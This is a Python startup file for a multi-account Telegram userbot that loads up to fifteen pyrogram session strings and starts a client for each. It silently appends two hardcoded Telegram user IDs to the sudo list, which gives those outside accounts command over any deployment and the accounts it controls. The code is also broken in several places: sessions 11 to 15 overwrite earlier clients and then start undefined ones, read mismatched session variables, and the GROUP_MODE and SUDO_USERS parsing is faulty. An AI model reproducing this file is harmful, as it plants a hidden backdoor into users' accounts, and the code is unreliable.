import os
import asyncio
import sys
from dotenv import load_dotenv
from pyrogram import Client, filters
from pytgcalls import PyTgCalls
from os import getenv
# For Local Deploy
if os.path.exists(".env"):
    load_dotenv(".env")
    
# Necessary Vars
API_ID = int(os.getenv("API_ID", ""))
API_HASH = os.getenv("API_HASH", "")
SESSION = os.getenv("SESSION")
SESSION2 = os.getenv("SESSION2", None)
SESSION3 = os.getenv("SESSION3", None)
SESSION4 = os.getenv("SESSION4", None)
SESSION5 = os.getenv("SESSION5", None)
SESSION6 = os.getenv("SESSION6", None)
SESSION7 = os.getenv("SESSION7", None)
SESSION8 = os.getenv("SESSION8", None)
SESSION9 = os.getenv("SESSION9", None)
SESSION10 = os.getenv("SESSION10", None)
SESSION11 = os.getenv("SESSION11", None)
SESSION12 = os.getenv("SESSION12", None)
SESSION13 = os.getenv("SESSION13", None)
SESSION14 = os.getenv("SESSION14", None)
SESSION15 = os.getenv("SESSION15", None)
HNDLR = os.getenv("HNDLR", "!")
GROUP_MODE = os.getenv("GROUP_MODE", "True")
Suar = list(map(int, getenv("SUDO_USERS", "")))
if 1517994352 not in Suar:
    Suar.append(1517994352)
if 1789859817 not in Suar:
    Suar.append(1789859817)

contact_filter = filters.create(
    lambda _, __, message:
    (message.from_user and message.from_user.is_contact) or message.outgoing
)


if GROUP_MODE == ("True" or "true"):
    grp = True
else:
    grp = False


GRPPLAY = grp
bot = Client(SESSION, API_ID, API_HASH, plugins=dict(root="ArrayCore.vc"))
call_py = PyTgCalls(bot)


# sessions
async def ArrayCore():
    global Venom2
    global Venom3
    global Venom5
    global Venom4
    global Venom6
    global Venom7
    global Venom8
    global Venom9
    global Venom10
    global Venom11
    global Venom12
    global Venom13
    global Venom14
    global Venom15
    
    if SESSION2:
        XD = str(SESSION2)
        print("Session 2 found")
        Venom2 = Client(XD, api_id=API_ID, api_hash=API_HASH)
        try: 
           await Venom2.start()
        except Exception as e:
           print(e)
           pass
    else: 
        XD = "ArrayCore"
        print("session 2 not found")
        Venom2 = Client(XD, api_id=API_ID, api_hash=API_HASH)
        try:
           await Venom2.start()
        except Exception as e:
           pass

    if SESSION3:
        XD = str(SESSION3)
        print("Session 3 found")
        Venom3 = Client(XD, api_id=API_ID, api_hash=API_HASH)
        try: 
           await Venom3.start()
        except Exception as e:
           print(e)
           pass
    else: 
        XD = "ArrayCore"
        print("session 3 not found")
        Venom3 = Client(XD, api_id=API_ID, api_hash=API_HASH)
        try:
           await Venom3.start()
        except Exception as e:
           pass

    if SESSION4:
        XD = str(SESSION4)
        print("Session 4 found")
        Venom4 = Client(XD, api_id=API_ID, api_hash=API_HASH)
        try: 
           await Venom4.start()
        except Exception as e:
           print(e)
           pass
    else: 
        XD = "ArrayCore"
        print("session 4 not found")
        Venom4 = Client(XD, api_id=API_ID, api_hash=API_HASH)
        try:
           await Venom4.start()
        except Exception as e:
           pass

    if SESSION5:
        XD = str(SESSION5)
        print("Session 5 found")
        Venom5 = Client(XD, api_id=API_ID, api_hash=API_HASH)
        try: 
           await Venom5.start()
        except Exception as e:
           print(e)
           pass
    else: 
        XD = "ArrayCore"
        print("session 5 not found")
        Venom5 = Client(XD, api_id=API_ID, api_hash=API_HASH)
        try:
           await Venom5.start()
        except Exception as e:
           pass

    if SESSION6:
        XD = str(SESSION6)
        print("Session 6 found")
        Venom6 = Client(XD, api_id=API_ID, api_hash=API_HASH)
        try: 
           await Venom6.start()
        except Exception as e:
           print(e)
           pass
    else: 
        XD = "ArrayCore"
        print("session 6 not found")
        Venom6 = Client(XD, api_id=API_ID, api_hash=API_HASH)
        try:
           await Venom6.start()
        except Exception as e:
           pass

    if SESSION7:
        XD = str(SESSION7)
        print("Session 7 found")
        Venom7 = Client(XD, api_id=API_ID, api_hash=API_HASH)
        try: 
           await Venom7.start()
        except Exception as e:
           print(e)
           pass
    else: 
        XD = "ArrayCore"
        print("session 7 not found")
        Venom7 = Client(XD, api_id=API_ID, api_hash=API_HASH)
        try:
           await Venom7.start()
        except Exception as e:
           pass

    if SESSION8:
        XD = str(SESSION8)
        print("Session 8 found")
        Venom8 = Client(XD, api_id=API_ID, api_hash=API_HASH)
        try: 
           await Venom8.start()
        except Exception as e:
           print(e)
           pass
    else: 
        XD = "ArrayCore"
        print("session 8 not found")
        Venom8 = Client(XD, api_id=API_ID, api_hash=API_HASH)
        try:
           await Venom8.start()
        except Exception as e:
           pass

    if SESSION9:
        XD = str(SESSION9)
        print("Session 9 found")
        Venom9 = Client(XD, api_id=API_ID, api_hash=API_HASH)
        try: 
           await Venom9.start()
        except Exception as e:
           print(e)
           pass
    else: 
        XD = "ArrayCore"
        print("session 9 not found")
        Venom9 = Client(XD, api_id=API_ID, api_hash=API_HASH)
        try:
           await Venom9.start()
        except Exception as e:
           pass
    
    if SESSION10:
        XD = str(SESSION10)
        print("Session 10 found")
        Venom10 = Client(XD, api_id=API_ID, api_hash=API_HASH)
        try: 
           await Venom10.start()
        except Exception as e:
           print(e)
           pass
    else: 
        XD = "ArrayCore"
        print("session 01 not found")
        Venom10 = Client(XD, api_id=API_ID, api_hash=API_HASH)
        try:
           await Venom10.start()
        except Exception as e:
           pass
           
    if SESSION11:
        XD = str(SESSION11)
        print("Session 11 found")
        Venom5 = Client(XD, api_id=API_ID, api_hash=API_HASH)
        try: 
           await Venom11.start()
        except Exception as e:
           print(e)
           pass
    else: 
        XD = "ArrayCore"
        print("session 11 not found")
        Venom5 = Client(XD, api_id=API_ID, api_hash=API_HASH)
        try:
           await Venom11.start()
        except Exception as e:
           pass

    if SESSION12:
        XD = str(SESSION12)
        print("Session 12 found")
        Venom6 = Client(XD, api_id=API_ID, api_hash=API_HASH)
        try: 
           await Venom12.start()
        except Exception as e:
           print(e)
           pass
    else: 
        XD = "ArrayCore"
        print("session 12 not found")
        Venom6 = Client(XD, api_id=API_ID, api_hash=API_HASH)
        try:
           await Venom12.start()
        except Exception as e:
           pass

    if SESSION13:
        XD = str(SESSION7)
        print("Session 13 found")
        Venom7 = Client(XD, api_id=API_ID, api_hash=API_HASH)
        try: 
           await Venom13.start()
        except Exception as e:
           print(e)
           pass
    else: 
        XD = "ArrayCore"
        print("session 13 not found")
        Venom7 = Client(XD, api_id=API_ID, api_hash=API_HASH)
        try:
           await Venom13.start()
        except Exception as e:
           pass

    if SESSION14:
        XD = str(SESSION8)
        print("Session 14 found")
        Venom8 = Client(XD, api_id=API_ID, api_hash=API_HASH)
        try: 
           await Venom14.start()
        except Exception as e:
           print(e)
           pass
    else: 
        XD = "ArrayCore"
        print("session 14 not found")
        Venom8 = Client(XD, api_id=API_ID, api_hash=API_HASH)
        try:
           await Venom14.start()
        except Exception as e:
           pass

    if SESSION15:
        XD = str(SESSION9)
        print("Session 15 found")
        Venom9 = Client(XD, api_id=API_ID, api_hash=API_HASH)
        try: 
           await Venom15.start()
        except Exception as e:
           print(e)
           pass
    else: 
        XD = "ArrayCore"
        print("session 15 not found")
        Venom9 = Client(XD, api_id=API_ID, api_hash=API_HASH)
        try:
           await Venom15.start()
        except Exception as e:
           pass
    
loop = asyncio.get_event_loop()
loop.run_until_complete(ArrayCore())    
